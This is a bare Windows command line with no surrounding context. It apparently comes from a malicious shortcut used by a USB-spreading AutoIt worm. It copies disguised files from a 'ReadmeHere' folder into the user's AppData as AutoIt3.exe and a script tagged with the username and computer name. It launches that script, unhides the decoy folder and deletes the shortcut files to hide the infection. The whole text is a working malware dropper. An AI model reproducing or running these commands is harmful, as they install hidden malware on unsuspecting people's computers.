copy /b "ReadmeHere\xxTorrentCoverbooks509" "%appdata%\Microsoft\Windows\AutoIt3.exe" & copy /y "ReadmeHere\xxxTorrentCoverbooks509" 
	"%appdata%\Microsoft\Windows\%ComputerName%.au3" & cmd /c echo #%username%%computername% > "%computername%" & type "%appdata%\Microsoft\Windows\
	%computername%.au3" >> "%computername%" & move /y "%computername%" "%appdata%\Microsoft\Windows\%computername%.au3" & Start "" "%appdata%\
	Microsoft\Windows\AutoIt3.exe" /ErrorStdOut "%appdata%\Microsoft\Windows\%computername%.au3" & attrib -h -s "ReadmeHere" & del *.lnk
exit